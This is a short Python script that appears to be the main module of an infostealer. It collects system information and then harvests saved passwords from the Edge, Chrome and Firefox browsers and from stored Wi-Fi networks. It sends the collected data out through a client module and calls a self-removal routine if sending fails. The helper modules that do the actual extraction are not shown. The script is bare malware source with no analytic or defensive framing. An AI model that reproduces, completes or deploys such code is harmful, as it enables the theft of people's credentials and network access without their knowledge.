
import json

import Client as client
import System as system
import Chrome as chrome
import Firefox as firefox
import Wifi as wifi
import Edge as edge

import Document as doc


def dataCollect():

    doc.runTask()
    try:
        begining = system.info()

        set = begining.get("data")

        try:
            edge.get_password(set)
        except:
            print("No edge")

        try:
            chrome.password(set)
        except:
            print("No Chrome")

        try:
            firefox.password(set)
        except:
            print("No Firefox")

        try:
            wifi.password(set)
        except:
            print("No wifi")

    except:
        begining = {}

    return begining

try:
    client.sendData(json.dumps(dataCollect(), indent=4))
except:
    doc.removeitself()